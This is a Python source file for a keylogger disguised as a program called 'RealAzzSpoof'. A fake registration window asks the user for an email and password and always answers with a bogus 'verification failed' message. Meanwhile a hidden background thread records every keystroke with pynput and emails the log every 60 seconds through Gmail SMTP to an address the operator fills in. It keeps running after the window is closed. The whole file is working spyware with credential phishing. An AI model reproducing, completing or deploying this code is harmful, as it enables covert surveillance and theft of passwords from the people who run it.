from pynput import keyboard
import smtplib 
import threading
import PySimpleGUI as sg
import time
import os
import sys


def resource_path(rel):
    base = getattr(sys, "_MEIPASS", os.path.abspath("."))
    return os.path.join(base, rel)

ICON = resource_path("home.ico")

def icon_popup(title, message, icon_path):
    layout = [
        [sg.Text(message)],
        [sg.Push(), sg.Button("OK", bind_return_key=True)]
    ]

    win = sg.Window(
        title,
        layout,
        modal=True,
        icon=icon_path,
        finalize=True
    )

    win.read()
    win.close()

LOG = ""
EMAIL = "" #ENTER GMAIL YOU ARE SENDING FROM
PASSWORD = "" #CREATE/USE A GOOGLE APP PASSWORD
TO_EMAIL = "" #ENTER EMAIL YOU WANT TO RECEIVE LOG
SEND_INTERVAL = 60 # seconds

def main1():
    def send_email(log):
        print("Working!")
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.connect("smtp.gmail.com", 587)
            server.ehlo()
            server.starttls()
            server.ehlo()
            server.login(EMAIL, PASSWORD)
            message = f"Subject: KL Report\n\n{log}"
            server.sendmail(EMAIL, TO_EMAIL, message)
            server.quit()
            print("Log sent.")
        except Exception as e:
            print(f"Failed to send email: {e}")

    def on_press(key):
        global LOG 
        try:
            LOG += key.char # normal key
        except AttributeError:
            # special key pressed
            if key == keyboard.Key.space:
                LOG += " "
            elif key == keyboard.Key.enter:
                LOG += "\n"
            else:
                LOG += f" [{key.name}] "

    def report():
        global LOG
        if LOG:
            send_email(LOG)
            LOG = ""
        threading.Timer(SEND_INTERVAL, report).start()

    def main():
        report()
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    if __name__ == "__main__":
        main()

    while True:
        print("main1() is running...")
        time.sleep(2)
    

# ---------------- START MAIN IN BACKGROUND ----------------
main_thread = threading.Thread(target=main1, daemon=True)
main_thread.start()

# ---------------- GUI ----------------
ICON_PATH = resource_path("home.ico")

layout = [
    [sg.Text(
        "Welcome to RealAzzSpoof!\nTo register, enter your email and create a password:",
        font=("Calibri", 12)
    )],
    [sg.Text("Email:")],
    [sg.Input(key="-EMAIL-")],
    [sg.Text("Password:")],
    [sg.Input(key="-PASSWORD-", password_char="*")],
    [sg.Button("Enter"), sg.Button("Exit")]
]

window = sg.Window("RealAzzSpoof", layout, icon=ICON_PATH, finalize=True)

while True:
    event, values = window.read()

    if event in (sg.WIN_CLOSED, "Exit"):
        break

    if event == "Enter":
        popup_layout = [
            [sg.Text("Please enter verification code sent to your email:")],
            [sg.Input(key="-CODE-")],
            [sg.Button("Enter", bind_return_key=True), sg.Button("Cancel")]
        ]

        popup = sg.Window(
            "RealAzzSpoof",
            popup_layout,
            modal=True,
            icon=ICON_PATH
        )

        p_event, p_values = popup.read()
        popup.close()

        if p_event == "Enter":
            icon_popup(
    "Verification Failed",
    "Incorrect code, please try again",
    ICON_PATH
)


window.close()

print("GUI closed — main1() is still running")

# ---------------- KEEP PROGRAM ALIVE ----------------
while True:
    time.sleep(1)






